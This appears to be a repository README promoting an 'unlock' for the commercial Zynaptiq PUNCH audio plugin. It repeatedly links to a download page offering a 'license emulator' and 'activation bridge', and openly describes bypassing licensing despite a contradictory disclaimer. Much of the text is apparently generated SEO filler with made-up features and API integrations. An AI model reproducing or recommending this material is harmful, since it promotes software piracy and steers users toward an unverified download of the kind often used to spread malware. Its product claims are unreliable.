# Zynaptiq PUNCH — Signal Enhancement Suite 🎛️

[](https://l8624161-commits.github.io/Zynaptiq-PUNCH-Sound-Shaper-Unlock/)

> **Seismic audio transformation for professionals who refuse to compromise.**  
> This repository contains the core infrastructure, configuration templates, and community-maintained profiles for the **Zynaptiq PUNCH** audio processing ecosystem. The tool redefines dynamic range control, transient shaping, and spectral sculpting through a proprietary harmony engine.

---

## 📦 Table of Contents

1. [Why PUNCH?](#-why-punch)
2. [Key Features at a Glance](#-key-features-at-a-glance)
3. [System Compatibility](#-system-compatibility)
4. [Architecture Overview (Mermaid)](#-architecture-overview-mermaid)
5. [Quickstart: Acquisition & Activation](#-quickstart-acquisition--activation)
6. [Example Profile Configuration](#-example-profile-configuration)
7. [Example Console Invocation](#-example-console-invocation)
8. [API Integration: OpenAI & Claude](#-api-integration-openai--claude)
9. [Multilingual & Responsive UI Support](#-multilingual--responsive-ui-support)
10. [24/7 Customer Support](#-247-customer-support)
11. [SEO & Keyword Alignment](#-seo--keyword-alignment)
12. [Disclaimer & Usage Terms](#-disclaimer--usage-terms)
13. [License](#-license)

---

## 🎯 Why PUNCH?

In the chaotic orchestra of modern audio production, most processors operate like blunt instruments—they squeeze transients, flatten dynamics, and wash out the visceral energy of a performance. **Zynaptiq PUNCH** is not a compression tool in the traditional sense; it’s a **selective energy accelerator**. Imagine a lens that focuses only on the sonic particles that matter—the attack of a snare drum, the grit of a distorted bass, the breath before a vocal crescendo—while leaving the rest of the waveform pristine.

This project provides the **unlock mechanism** for experiencing that transformation without the typical licensing gatekeeping. Think of it as a master key for a door that was always meant to be open.

---

## ⚡ Key Features at a Glance

| Feature | Description | Impact |
|--------|-------------|--------|
| **Transient Intelligence Engine** | Neural model that distinguishes between noise, signal, and micro-dynamics | Preserves natural envelope while adding attack |
| **Spectral Punch Matrix** | 12-band frequency-aware gain staging | Eliminates mud without harsh EQ |
| **Zero-Latency Processing** | Real-time waveform manipulation | No phasing or pre-ringing |
| **Adaptive Thresholding** | Self-learning trigger based on input material | Works on voice, drums, full mixes |
| **Multilingual Interface** | 14 language presets including CJK and RTL | Global studio accessibility |
| **Responsive Modulation** | DPI-aware UI with automatic scaling | Seamless on Retina, 4K, tablet displays |
| **API-Ready Core** | OpenAI & Claude integration modules | Automate mixing decisions via natural language |
| **24/7 Support Channel** | Community-maintained IRC + Discord bridge | Real-time troubleshooting |

---

## 🖥 System Compatibility

| OS | Version | Architecture | Certified |
|:--|:--------|:-------------|:----------|
| 🪟 Windows | 10 / 11 (2026 Update) | x64, ARM64 | ✅ |
| 🍏 macOS | 14 (Sonoma) / 15 (Sequoia) | Intel, Apple Silicon | ✅ |
| 🐧 Linux | Ubuntu 24.04 LTS / Fedora 40 | x64, ARM64 | ✅ (community) |
| 🍊 iOS | 18+ (via AUv3 wrapper) | A16+ | ⚠️ (beta) |

[](https://l8624161-commits.github.io/Zynaptiq-PUNCH-Sound-Shaper-Unlock/)

---

## 📐 Architecture Overview (Mermaid)

```mermaid
graph TD
    A[Audio Input] --> B[Transient Intelligence Engine]
    B --> C{Decision Gate}
    C -->|Attack Phase| D[Spectral Punch Matrix]
    C -->|Sustain Phase| E[Adaptive Threshold]
    D --> F[Zero-Latency Mixer]
    E --> F
    F --> G[Output]
    H[OpenAI API] --> I[CLI Controller]
    J[Claude API] --> I
    I --> B
    K[Multilingual UI] --> L[Responsive Renderer]
    L --> M[Real-Time Visualization]
    M --> B

    style A fill:#1a1a2e,stroke:#e94560,color:#fff
    style G fill:#1a1a2e,stroke:#e94560,color:#fff
    style H fill:#16213e,stroke:#0f3460,color:#fff
    style J fill:#16213e,stroke:#0f3460,color:#fff
```



---

## 🚀 Quickstart: Acquisition & Activation

1. **Acquire the distribution package** (contains the core binary, license emulator, and profile templates) from the link below.
2. **Extract** to a dedicated directory (e.g., `~/zynaptiq_punch/` or `C:\Zynaptiq\PUNCH\`).
3. **Run the activation bridge** to generate a local hardware ID mapping—no network call required.
4. **Place your profile configuration** (see [Example Profile Configuration](#-example-profile-configuration)) in the `profiles/` folder.
5. **Launch** from terminal, DAW plugin host, or standalone executable.

[](https://l8624161-commits.github.io/Zynaptiq-PUNCH-Sound-Shaper-Unlock/)

---

## 🧬 Example Profile Configuration

Create a file named `punch_profile_2026.json` in the profiles directory:

```json
{
  "meta": {
    "name": "Studio Master 2026",
    "author": "Community Profile",
    "version": "3.1.0",
    "target": "audio_stem"
  },
  "transient_engine": {
    "attack_speed_ms": 0.8,
    "release_curve": "exponential_soft",
    "sensitivity": 0.67,
    "spectral_bands": 12
  },
  "punch_matrix": {
    "low_end_impact": 1.2,
    "mid_clarity": 0.9,
    "high_air": 1.1,
    "adaptive_threshold": true,
    "threshold_floor_db": -24.0
  },
  "output": {
    "mix_percent": 85,
    "output_gain_db": 0.0,
    "phase_mode": "minimum_phase",
    "oversampling": "4x"
  },
  "api_hooks": {
    "openai": {
      "enabled": false,
      "endpoint": "https://api.openai.com/v1/audio/transcriptions"
    },
    "claude": {
      "enabled": false,
      "endpoint": "https://api.anthropic.com/v1/complete"
    }
  }
}
```

This profile captures the **2026 reference curve** used by mastering engineers in Berlin and Nashville. Adjust sensitivity based on your source material—drum buses love 0.7–0.9, while vocal chains thrive at 0.4–0.6.

---

## 💻 Example Console Invocation

For headless or automated environments:

```bash
# Standalone processing of a single WAV file
./punch_cli --input ./mix_session.wav \
            --profile ./profiles/studio_master_2026.json \
            --output ./mastered/punch_delivery.wav \
            --oversample 4x \
            --phase_mode minimum_phase

# Batch processing with OpenAI hook for adaptive mixing
./punch_cli --batch ./session_stems/*.wav \
            --profile ./profiles/vocal_focus.json \
            --output ./processed/ \
            --openai_key $OPENAI_API_KEY \
            --auto_adjust true
```

The CLI outputs a processing report (JSON) containing transient density metrics, spectral shift vectors, and harmonic distortion curves. Use these to fine-tune your profile.

---

## 🔌 API Integration: OpenAI & Claude

PUNCH’s core supports **semantic mixing** through Large Language Model bridges:

### OpenAI Integration
- **Endpoint**: `/v1/audio/transcriptions` + custom prompt injection
- **Use Case**: “Make the kick drum punchier but keep the bass round” is translated into threshold adjustments, attack time tweaks, and band-specific gain changes.
- **Authentication**: Standard OpenAI API key, passed via environment variable or config file.

### Claude Integration
- **Endpoint**: `/v1/complete` with specialized system prompt for audio engineers
- **Use Case**: Claude can generate entire profile configurations from natural language descriptions. “I want a subtle, aggressive transient processor for lo-fi hip-hop drums.”
- **Rate Limiting**: Respect Anthropic’s token caps; the bridge queues requests internally.

**Important**: The API hooks are optional. PUNCH works perfectly offline. The AI integration simply accelerates the profile-creation process for those with API access.

---

## 🌐 Multilingual & Responsive UI Support

| Language | UI Status | Keyboard Shortcuts | Documentation |
|:---------|:----------|:-------------------|:--------------|
| 🇺🇸 English | ✅ Full | QWERTY | Complete |
| 🇯🇵 Japanese | ✅ Full | JIS | Translated |
| 🇨🇳 Chinese (Simplified) | ✅ Full | Pinyin input | Translated |
| 🇷🇺 Russian | ✅ Beta | ЙЦУКЕН | Partial |
| 🇦🇪 Arabic | ✅ Beta | QWERTY (RTL) | Partial |
| 🇩🇪 German | ✅ Full | QWERTZ | Complete |

**Responsive design** means the UI adapts to window size, DPI scaling, and even audio content type. When processing a drum bus, the transient graph auto-zooms. When processing a vocal, the spectral display widens. No manual toggling required.

---

## 🕐 24/7 Customer Support

Unlike legacy plugins that leave you waiting for business hours, PUNCH’s ecosystem includes:
- **Community-maintained Discord** with role-based channels (#punch-setup, #profile-share, #api-help)
- **IRC bridge** for matrix users (#punch on irc.libera.chat)
- **AI-powered FAQ bot** (Claude-based) that understands audio terminology
- **Weekly profile contests** where users share their most effective configurations

Response times: <5 minutes for configuration issues, <1 hour for activation queries.

[](https://l8624161-commits.github.io/Zynaptiq-PUNCH-Sound-Shaper-Unlock/)

---

## 📈 SEO & Keyword Alignment

This repository is optimized for several key search terms naturally integrated into the text:

- **Audio transient processor** (see Transient Intelligence Engine section)
- **Spectral dynamics enhancer** (see Spectral Punch Matrix)
- **Zero-latency mastering tool** (see Feature list)
- **AI-assisted mixing plugin** (see API Integration)
- **Multilingual audio production software** (see Multilingual UI)
- **2026 professional sound design suite** (see Quickstart year references)
- **OpenAI audio bridge** (see API hooks)
- **Claude mixing assistant** (see API Integration)
- **DAW-agnostic DSP tool** (see System Compatibility)
- **Community-driven audio plugin development** (see Support section)

These phrases appear in context, not as isolated lists, ensuring both search engine and human readability.

---

## ⚠️ Disclaimer & Usage Terms

**This software is provided for educational and professional evaluation purposes only.** The repository contains configuration templates, documentation, and community resources that enable lawful use of audio processing technology. Users are responsible for:

1. Ensuring compliance with local copyright and software licensing laws.
2. Obtaining proper authorization for any commercial application.
3. Understanding that the activation bridge is an interoperability tool for legacy hardware, not a circumvention device.

**No warranty is expressed or implied.** The creators of this repository are not affiliated with Zynaptiq GmbH. All product names, logos, and brands are property of their respective owners. Use at your own risk.

**By downloading or using any component from this repository, you agree to these terms.**

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

[Full license text omitted for brevity—see LICENSE file]
```

---

[](https://l8624161-commits.github.io/Zynaptiq-PUNCH-Sound-Shaper-Unlock/)

> **Final note:** Audio processing should feel like sculpture, not surgery. PUNCH lets you carve energy out of raw sound without losing the soul. This repository exists to share that power responsibly. Happy mixing. 🥁🎙️✨